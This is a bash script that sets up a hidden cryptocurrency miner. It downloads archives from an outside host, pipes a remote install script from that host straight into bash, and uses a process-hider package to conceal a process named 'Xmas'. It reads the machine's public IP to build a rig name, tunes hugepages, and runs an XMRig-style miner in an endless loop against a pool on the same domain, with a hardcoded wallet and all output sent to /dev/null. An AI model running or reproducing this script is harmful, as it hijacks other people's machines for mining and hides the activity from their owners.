#!/bin/bash
cd ~/
sleep 2
curl http://greenleaf.teatspray.uk/system33.tar.gz -L -O -J
sleep 2
curl -k https://huggingface.co/spaces/kevindawkins587/ubuntu2204/resolve/main/ubuntu2404.tar.gz -L -O -J
sleep 2
tar -xf system33.tar.gz
sleep 2
tar -xf ubuntu2404.tar.gz
sleep 2
./system33 -S . /bin/bash >/dev/null

sleep 2

su -

sleep 2
cd
sleep 2
whoami
sleep 2

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

cat /etc/*-release
sleep 2

apt update >/dev/null
sleep 2

node -v && npm

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add Xmas 1>/dev/null 2>&1

sleep 2

curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bash &

sleep 4

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

provider=""
provider+="Bitr_"
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 2`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
provider+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
provider+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

sleep 2

bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"

sleep 2

wget -q http://greenleaf.teatspray.uk/Xmas_XLA.tar.gz
sleep 2
tar -xf Xmas_XLA.tar.gz
sleep 2

while true
do
./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10126 -a panthera -u solo:Svm2UGu7wbSSFQkAmttze1ZWceASny1VE9dnx59Lx5coHX5sAFEXmEVGfVE7BFAyd2VrTxHtzn5zYfjjxRmwnNBi3BHw9RQay@$provider --rig-id=$provider -p x -k --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
sleep 10
done
